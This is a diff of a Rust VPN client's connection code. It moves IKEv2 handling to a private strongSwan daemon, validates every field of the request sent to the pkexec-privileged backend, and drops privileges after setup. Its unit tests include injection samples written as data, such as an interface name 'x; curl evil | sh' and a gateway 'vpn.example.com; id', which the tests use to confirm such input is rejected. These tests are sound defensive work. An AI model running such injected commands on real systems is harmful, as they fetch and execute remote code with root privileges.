@@ -1,14 +1,17 @@
 //! Connection orchestration (all native Rust, no external interpreter).
 //!
 //! GUI side (unprivileged):  SAML login in-process (browser via xdg-open, local callback listener).
-//! Privileged side:          `pkexec <this binary> --backend` - IKEv2 + kernel XFRM tunnel.
+//! Privileged side:          `pkexec <this binary> --backend` - a private strongSwan charon does IKEv2 and the XFRM
+//!                           SAs; we add the xfrm interface, routes and DNS, then drop to the user + CAP_NET_ADMIN.
 //!   * the request (settings + PSK + one-time token) is sent as one JSON line on stdin, never on argv;
 //!   * afterwards stdin is a control channel: "disconnect" or EOF (GUI closed/crashed) => teardown;
 //!   * progress is reported as `@@{json}` lines on stdout, other lines are log output.
 
+use crate::charon::{self, ClientAuth, ConnParams};
 use crate::config::{Config, Profile, RouteMode, UserAuth};
-use crate::ike::{parse_proposals, Ike, IkeParams};
-use crate::tunnel::{purge_stale, set_udp_encap, Tunnel, TunnelOpts};
+use crate::net::{self, DhGroup, Encryption, Hash, Host, IfName, Ipv4Net, Mtu, Secret};
+use crate::tunnel::{Tunnel, TunnelOpts};
+use crate::{netlink, privdrop};
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
 use std::io::{BufRead, BufReader, Write};
@@ -39,27 +42,31 @@ pub struct Session {
     thread: Option<std::thread::JoinHandle<()>>,
 }
 
-#[derive(Serialize, Deserialize, Clone)]
+/// What the GUI asks the privileged backend to do. Every field is a checked type, so a malformed request is rejected
+/// while it's parsed, before anything runs as root.
+#[derive(Serialize, Deserialize, Clone, Debug)]
 pub struct BackendRequest {
-    pub gateway: String,
-    pub ike_port: u16,
-    pub uid: String,
-    pub psk: String,
+    pub gateway: Host,
+    pub ike_port: std::num::NonZeroU16,
+    pub psk: Secret,
     /// EAP identity (UID for SSO, username otherwise); None = PSK-only authentication
     pub eap_identity: Option<String>,
     /// EAP secret: SAML tokenid or password
-    pub token: String,
+    pub token: Secret,
     pub local_id: Option<String>,
-    pub dh_groups: Vec<u16>,
-    pub ike_proposals: String,
-    pub esp_proposals: String,
+    pub dh_groups: Vec<DhGroup>,
+    pub ike_proposals: Vec<(Encryption, Hash)>,
+    pub esp_proposals: Vec<(Encryption, Hash)>,
     pub natt_keepalive: u32,
-    pub ifname: String,
-    pub mtu: u16,
-    pub routes: Option<Vec<String>>,
+    pub ifname: IfName,
+    pub mtu: Mtu,
+    pub routes: Option<Vec<Ipv4Net>>,
     pub block_ipv6: bool,
     pub set_dns: bool,
     pub verbose: bool,
+    /// `--probe`: connect, report, disconnect; nothing is set up on this machine
+    #[serde(default)]
+    pub probe: bool,
 }
 
 impl Session {
@@ -119,51 +126,53 @@ fn credentials(cfg: &Config, p: &Profile, sso_token: Option<String>) -> (Option<
     }
 }
 
-fn build_request(cfg: &Config, p: &Profile, sso_token: Option<String>) -> BackendRequest {
+/// The backend request for profile `p`, with every setting checked. Errors name the setting to fix.
+fn build_request(cfg: &Config, p: &Profile, sso_token: Option<String>) -> Result<BackendRequest, String> {
     let (eap_identity, token) = credentials(cfg, p, sso_token);
-    let props = |v: &Vec<crate::config::Proposal>| v.iter().map(|x| x.spec()).collect::<Vec<_>>().join(",");
-    // first group is used in the KE payload: prefer the strongest selected ECP group
-    let mut groups: Vec<u16> = [20, 21, 19, 14].into_iter().filter(|g| p.ike.dh_groups.contains(g)).collect();
-    if groups.is_empty() {
-        groups.push(20);
-    }
-    BackendRequest {
-        gateway: p.gateway.trim().to_string(),
-        ike_port: p.ike.port,
-        uid: cfg.uid.clone(),
-        psk: p.psk.clone(),
+    let props = |v: &[crate::config::Proposal], phase: &str| -> Result<Vec<(Encryption, Hash)>, String> {
+        let v = v.iter().map(|x| Ok((Encryption::parse(&x.enc)?, Hash::parse(&x.hash)?))).collect::<Result<Vec<_>, String>>()?;
+        if v.is_empty() { Err(format!("{phase}: select at least one proposal")) } else { Ok(v) }
+    };
+    let routes = match p.network.route_mode {
+        RouteMode::Gateway => None,
+        RouteMode::Full => Some(vec!["0.0.0.0/0".parse()?]),
+        RouteMode::Custom => Some(
+            p.network.custom_routes
+                .split(|c: char| c == ',' || c.is_whitespace())
+                .filter(|r| !r.is_empty())
+                .map(|r| r.parse::<Ipv4Net>().map_err(|e| format!("custom routes: {e}")))
+                .collect::<Result<Vec<_>, String>>()?,
+        ),
+    };
+    Ok(BackendRequest {
+        gateway: p.gateway.parse().map_err(|e| format!("remote gateway: {e}"))?,
+        ike_port: std::num::NonZeroU16::new(p.ike.port).ok_or("IKE port: must be 1 to 65535")?,
+        psk: Secret(p.psk.clone()),
         eap_identity,
-        token,
+        token: Secret(token),
         local_id: Some(p.ike.local_id.trim().to_string()).filter(|s| !s.is_empty()),
-        dh_groups: groups,
-        ike_proposals: props(&p.ike.proposals),
-        esp_proposals: props(&p.esp.proposals),
+        dh_groups: p.ike.dh_groups.iter().map(|g| DhGroup::try_from(*g)).collect::<Result<_, _>>()?,
+        ike_proposals: props(&p.ike.proposals, "Phase 1")?,
+        esp_proposals: props(&p.esp.proposals, "Phase 2")?,
         natt_keepalive: p.ike.natt_keepalive,
-        ifname: p.network.ifname.clone(),
-        mtu: p.network.mtu,
-        routes: match p.network.route_mode {
-            RouteMode::Gateway => None,
-            RouteMode::Full => Some(vec!["0.0.0.0/0".into()]),
-            RouteMode::Custom => Some(
-                p.network.custom_routes
-                    .split(|c: char| c == ',' || c.is_whitespace())
-                    .filter(|r| !r.is_empty())
-                    .map(String::from)
-                    .collect(),
-            ),
-        },
+        ifname: p.network.ifname.parse().map_err(|e| format!("interface name: {e}"))?,
+        mtu: Mtu::try_from(p.network.mtu)?,
+        routes,
         block_ipv6: p.network.block_ipv6,
         set_dns: p.network.set_dns,
         verbose: cfg.verbose,
-    }
+        probe: false,
+    })
 }
 
 fn run(cfg: &Config, p: &Profile, shared: &Arc<Mutex<Shared>>, cancel: &Arc<AtomicBool>, send: Arc<dyn Fn(Event) + Send + Sync>) -> Result<(), String> {
     if p.gateway.trim().is_empty() {
         return Err("no remote gateway configured".into());
     }
-    parse_proposals(&p.ike.proposals.iter().map(|x| x.spec()).collect::<Vec<_>>().join(","))?;
-    parse_proposals(&p.esp.proposals.iter().map(|x| x.spec()).collect::<Vec<_>>().join(","))?;
+    if charon::charon_binary().is_none() {
+        return Err(charon::install_hint().into());
+    }
+    build_request(cfg, p, None)?; // every setting checked before the SSO login and the password prompt
     if p.psk.is_empty() {
         return Err("no pre-shared key configured".into());
     }
@@ -231,7 +240,7 @@ fn run_backend(
         .spawn()
         .map_err(|e| format!("cannot start pkexec: {e}"))?;
     let mut stdin = child.stdin.take().unwrap();
-    let req = serde_json::to_string(&build_request(cfg, p, sso_token)).unwrap() + "\n";
+    let req = serde_json::to_string(&build_request(cfg, p, sso_token)?).map_err(|e| e.to_string())? + "\n";
     stdin.write_all(req.as_bytes()).map_err(|e| format!("backend stdin: {e}"))?;
     stdin.flush().ok();
     shared.lock().unwrap().backend_stdin = Some(stdin);
@@ -338,97 +347,146 @@ pub fn privileged_main() -> i32 {
 }
 
 fn run_privileged(r: &BackendRequest) -> Result<(), String> {
-    status(json!({"event": "ike_start", "gateway": r.gateway}));
-    let mut ike = Ike::new(
-        IkeParams {
-            gateway: r.gateway.clone(),
-            port: r.ike_port,
-            psk: Some(r.psk.clone()),
-            uid: r.uid.clone(),
-            eap_identity: r.eap_identity.clone(),
-            token: r.token.clone(),
-            local_id: r.local_id.clone(),
-            groups: r.dh_groups.clone(),
-            ike_props: parse_proposals(&r.ike_proposals)?,
-            esp_props: parse_proposals(&r.esp_proposals)?,
-            fake_nat: true,
-        },
-        Box::new(blog),
-        Box::new(bdbg),
-    )?;
-    ike.sa_init()?;
-    let child = ike.auth()?;
-    blog("IKE SA + child SA established".into());
-    status(json!({"event": "established", "config": child.cfg}));
-    if let Some(b) = &child.cfg.banner {
-        blog(format!("banner: {b}"));
+    let binary = charon::charon_binary().ok_or_else(|| charon::install_hint().to_string())?;
+    // held until this process exits, also across the privilege drop
+    let _lock = charon::lock()?;
+    if charon::kill_stale() > 0 {
+        blog("stopped a charon left behind by a previous run".into());
     }
-    if STOP.load(Ordering::SeqCst) {
-        ike.delete();
+    if !r.probe {
+        let n = netlink::purge(&r.ifname)?;
+        if n > 0 {
+            blog(format!("purged {n} stale item(s) from a previous run"));
+        }
+    }
+    let dns_name = (r.set_dns && !r.probe).then(|| charon::resolvconf_name(&r.ifname, charon::resolvconf_target().as_deref()));
+    let conf = charon::write_config(&charon::config(r.natt_keepalive.max(5), r.verbose, dns_name.as_deref()))?;
+    status(json!({"event": "ike_start", "gateway": r.gateway.to_string()}));
+    // charon must be started from this (the main) thread: it gets SIGTERM when this thread ends
+    let mut child = charon::spawn(binary, &conf)?;
+    let stderr = child.stderr.take().expect("piped stderr");
+    std::thread::spawn(move || {
+        // always shown: startup and plugin errors are only explained here (verbose raises charon's log level)
+        for l in BufReader::new(stderr).lines().map_while(Result::ok) {
+            blog(format!("charon: {l}"));
+        }
+    });
+    let result = session(r, &mut child);
+    // SIGTERM so charon removes its SAs and policies; the kept CAP_KILL allows this after the privilege drop too
+    charon::stop(&mut child, Duration::from_secs(5));
+    result
+}
+
+/// One VPN session with charon running: connect, set up the tunnel, drop privileges, wait, tear down.
+fn session(r: &BackendRequest, child: &mut std::process::Child) -> Result<(), String> {
+    let mut v = charon::wait_for_socket(child, Duration::from_secs(5))?;
+    charon::check_plugins(&mut v, r.set_dns && !r.probe)?;
+    let auth = match &r.eap_identity {
+        Some(identity) => ClientAuth::Eap { identity: identity.clone(), secret: r.token.clone() },
+        None => ClientAuth::PskOnly,
+    };
+    let params = ConnParams {
+        gateway: r.gateway.clone(),
+        ike_port: r.ike_port.get(),
+        ike_proposals: net::ike_proposals(&r.ike_proposals, &r.dh_groups),
+        esp_proposals: net::esp_proposals(&r.esp_proposals),
+        local_id: r.local_id.clone(),
+        auth,
+        psk: r.psk.clone(),
+    };
+    if r.probe {
+        let est = charon::connect(&mut v, &params, &blog)?;
+        charon::terminate(&mut v);
+        blog(format!("PROBE OK: ip {} routes {:?}; SA deleted again", est.vip, est.remote_ts));
         status(json!({"event": "disconnected"}));
         return Ok(());
     }
-
-    let n = purge_stale(&r.ifname);
-    if n > 0 {
-        blog(format!("purged {n} stale item(s) from a previous run"));
-    }
+    // the interface exists before IKE, so charon can hand the VPN's DNS servers to resolvconf for it
     let opts = TunnelOpts { ifname: r.ifname.clone(), mtu: r.mtu, routes: r.routes.clone(), block_ipv6: r.block_ipv6, set_dns: r.set_dns };
-    let mut tun = Tunnel::up(&ike, &child, &opts, &bdbg)?;
-    status(json!({"event": "tunnel_up", "ifname": r.ifname, "ip": child.cfg.ip, "routes": tun.routes,
-                  "dns": child.cfg.dns, "domain": child.cfg.domain, "full_tunnel": tun.full}));
-    blog(format!("tunnel up: {} ip={:?} routes={:?}", r.ifname, child.cfg.ip, tun.routes));
+    let mut tun = Tunnel::create(&opts, &bdbg)?;
+    let result = tunnel_session(&mut v, &mut tun, &params, &opts);
+    tun.down(&bdbg);
+    charon::terminate(&mut v);
+    if result.is_ok() {
+        blog("disconnected".into());
+        status(json!({"event": "disconnected"}));
+    }
+    result
+}
+
+/// Connect, configure the interface, drop privileges and wait until the session ends. The caller tears down.
+fn tunnel_session(v: &mut crate::vici::Vici, tun: &mut Tunnel, params: &ConnParams, opts: &TunnelOpts) -> Result<(), String> {
+    let est = charon::connect(v, params, &blog)?;
+    blog(format!("IKE SA + child SA established: ip {} routes {:?}", est.vip, est.remote_ts));
+    status(json!({"event": "established", "config": {"ip": est.vip}}));
+    if STOP.load(Ordering::SeqCst) {
+        return Ok(());
+    }
+    tun.configure(&est, opts, &bdbg)?;
+    let routes: Vec<String> = tun.routes.iter().map(|n| n.to_string()).collect();
+    status(json!({"event": "tunnel_up", "ifname": opts.ifname.to_string(), "ip": est.vip, "routes": routes, "full_tunnel": tun.full}));
+    blog(format!("tunnel up: {} ip={} routes={routes:?}", opts.ifname, est.vip));
+
+    // charon reports the SA going down (gateway delete, DPD timeout) as ike-updown
+    v.register("ike-updown")?;
+    privdrop::drop_to(privdrop::pkexec_uid()?)?;
+    blog("running as your user now, keeping only the network-admin and kill capabilities".into());
     status(json!({"event": "connected"}));
 
-    // keepalive / DPD loop
-    ike.sock.set_read_timeout(Some(Duration::from_secs(1))).ok();
-    let mut last_ka = Instant::now() - Duration::from_secs(3600);
     let mut reason = "disconnect requested";
     while !STOP.load(Ordering::SeqCst) {
-        if last_ka.elapsed() >= Duration::from_secs(r.natt_keepalive.max(5) as u64) {
-            ike.send_keepalive();
-            last_ka = Instant::now();
-        }
-        match ike.recv_msg() {
-            Ok(msg) if msg[19] & 0x20 == 0 => match ike.handle_peer_request(&msg) {
-                Ok(true) => {
-                    reason = "gateway deleted the SA";
-                    break;
-                }
-                Ok(false) => {}
-                Err(e) => bdbg(format!("ignored bad message: {e}")),
-            },
+        match v.next_event(Duration::from_secs(1)) {
+            Ok(Some((name, body))) if name == "ike-updown" && charon::is_down(&body) => {
+                reason = "the gateway ended the connection";
+                break;
+            }
             Ok(_) => {}
-            Err(e) if matches!(e.kind(), std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut) => {}
             Err(e) => {
-                bdbg(format!("socket: {e}"));
-                std::thread::sleep(Duration::from_millis(500));
+                blog(format!("charon stopped: {e}"));
+                reason = "strongSwan stopped";
+                break;
             }
         }
     }
     blog(format!("disconnecting: {reason}"));
     status(json!({"event": "disconnecting"}));
-    tun.down(&bdbg);
-    let _ = set_udp_encap(&ike, false);
-    if reason != "gateway deleted the SA" {
-        ike.delete();
-    }
-    blog("disconnected".into());
-    status(json!({"event": "disconnected"}));
     Ok(())
 }
 
-/// `fortisaml-gui --down [ifname]`: remove leftovers (needs root).
+/// `fortisaml-gui --down [ifname]`: remove leftovers of a crashed session (needs root).
 pub fn down_main(ifname: &str) -> i32 {
-    let n = purge_stale(ifname);
-    println!("removed {n} stale item(s)");
-    0
+    let ifname: IfName = match ifname.parse() {
+        Ok(n) => n,
+        Err(e) => {
+            eprintln!("{e}");
+            return 2;
+        }
+    };
+    // refuses while a session runs: its interface and charon aren't leftovers
+    let _lock = match charon::lock() {
+        Ok(l) => l,
+        Err(e) => {
+            eprintln!("{e}");
+            return 1;
+        }
+    };
+    let stopped = charon::kill_stale();
+    match netlink::purge(&ifname) {
+        Ok(n) => {
+            println!("removed {} stale item(s)", n + stopped);
+            0
+        }
+        Err(e) => {
+            eprintln!("{e}");
+            1
+        }
+    }
 }
 
 /// `fortisaml-gui --probe [--gateway H] [--saml-port P] [--ike-port P] [--psk K] [--no-verify] [--no-browser]
 ///                        [--token T] [--no-sso --username U --password P | --no-eap] [-v]`
-/// Unprivileged end-to-end test: SAML + IKEv2/EAP negotiation with the selected profile (overridable),
-/// prints the result and deletes the SA again. Nothing is installed in the kernel.
+/// End-to-end test: SAML + IKEv2/EAP negotiation with the selected profile (overridable) through a private charon
+/// (root via pkexec), prints the result and deletes the SA again. No interface, routes or DNS are set up.
 pub fn probe_main(args: &[String]) -> i32 {
     let arg = |k: &str| args.iter().position(|a| a == k).and_then(|i| args.get(i + 1)).cloned();
     let flag = |k: &str| args.iter().any(|a| a == k);
@@ -496,31 +554,24 @@ pub fn probe_main(args: &[String]) -> i32 {
                 .token
             }),
         };
-        let req = build_request(&cfg, &p, token);
-        let mut ike = Ike::new(
-            IkeParams {
-                gateway: req.gateway.clone(),
-                port: req.ike_port,
-                psk: Some(req.psk.clone()),
-                uid: req.uid.clone(),
-                eap_identity: req.eap_identity.clone(),
-                token: req.token.clone(),
-                local_id: req.local_id.clone(),
-                groups: req.dh_groups.clone(),
-                ike_props: parse_proposals(&req.ike_proposals)?,
-                esp_props: parse_proposals(&req.esp_proposals)?,
-                fake_nat: true,
-            },
-            Box::new(blog),
-            Box::new(bdbg),
-        )?;
-        ike.sa_init()?;
-        let c = ike.auth()?;
-        blog(format!("PROBE OK: IKE SA + child SA established; config {}", serde_json::to_string(&c.cfg).unwrap()));
-        blog(format!("TSr {:?}, ESP integ {}, SPI out {} in {}", c.tsr, c.integ, crate::ike::hex(&c.spi_out), crate::ike::hex(&c.spi_in)));
-        ike.delete();
-        blog("SA deleted".into());
-        Ok(())
+        let mut req = build_request(&cfg, &p, token)?;
+        req.probe = true;
+        req.verbose = flag("-v");
+        let exe = std::env::current_exe().map_err(|e| format!("cannot locate own executable: {e}"))?;
+        blog("requesting root privileges (pkexec) to run strongSwan".into());
+        let mut child = Command::new("pkexec")
+            .arg(&exe)
+            .arg("--backend")
+            .stdin(Stdio::piped())
+            .spawn()
+            .map_err(|e| format!("cannot start pkexec: {e}"))?;
+        let mut stdin = child.stdin.take().expect("piped stdin");
+        let line = serde_json::to_string(&req).map_err(|e| e.to_string())? + "\n";
+        stdin.write_all(line.as_bytes()).map_err(|e| format!("backend stdin: {e}"))?;
+        // stdin stays open while the backend works: EOF would mean "disconnect"
+        let st = child.wait().map_err(|e| e.to_string())?;
+        drop(stdin);
+        if st.success() { Ok(()) } else { Err(format!("backend exited with {st}")) }
     })();
     match result {
         Ok(()) => 0,
@@ -528,5 +579,58 @@ pub fn probe_main(args: &[String]) -> i32 {
             blog(format!("PROBE FAILED: {e}"));
             1
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn profile() -> (Config, Profile) {
+        let cfg = Config::default();
+        let mut p = cfg.profiles[0].clone();
+        p.gateway = "vpn.example.com".into();
+        p.psk = "k".into();
+        (cfg, p)
+    }
+
+    #[test]
+    fn request_from_a_normal_profile() {
+        let (cfg, p) = profile();
+        let r = build_request(&cfg, &p, Some("tok".into())).unwrap();
+        assert_eq!(r.eap_identity.as_deref(), Some(cfg.uid.as_str()), "SSO: the FortiClient UID is the EAP identity");
+        assert_eq!(r.token, Secret("tok".into()));
+        assert_eq!(net::ike_proposals(&r.ike_proposals, &r.dh_groups), ["aes128-sha1-ecp384", "aes256-sha256-ecp384"]);
+        assert_eq!(r.routes, None);
+    }
+
+    #[test]
+    fn hostile_or_broken_profiles_are_refused_before_pkexec() {
+        let (cfg, p) = profile();
+        let bad = |f: &dyn Fn(&mut Profile)| {
+            let mut q = p.clone();
+            f(&mut q);
+            build_request(&cfg, &q, None).unwrap_err()
+        };
+        assert!(bad(&|q| q.network.ifname = "x; curl evil | sh".into()).starts_with("interface name:"));
+        assert!(bad(&|q| q.gateway = "vpn.example.com; id".into()).starts_with("remote gateway:"));
+        let e = bad(&|q| {
+            q.network.route_mode = RouteMode::Custom;
+            q.network.custom_routes = "10.0.0.0/8, 10.1.2.3/16".into();
+        });
+        assert!(e.starts_with("custom routes:") && e.contains("did you mean 10.1.0.0/16"), "{e}");
+        assert!(bad(&|q| q.ike.dh_groups = vec![5]).contains("DH group 5"));
+        assert!(bad(&|q| q.ike.proposals[0].enc = "DES".into()).contains("unsupported encryption"));
+        assert!(bad(&|q| q.network.mtu = 9000).contains("MTU"));
+        assert!(bad(&|q| q.ike.port = 0).starts_with("IKE port"));
+    }
+
+    #[test]
+    fn request_json_with_a_bad_value_is_rejected_by_the_backend() {
+        let (cfg, p) = profile();
+        let mut v = serde_json::to_value(build_request(&cfg, &p, None).unwrap()).unwrap();
+        v["ifname"] = "-x".into();
+        let e = serde_json::from_value::<BackendRequest>(v).unwrap_err().to_string();
+        assert!(e.contains("invalid interface name"), "{e}");
     }
 }
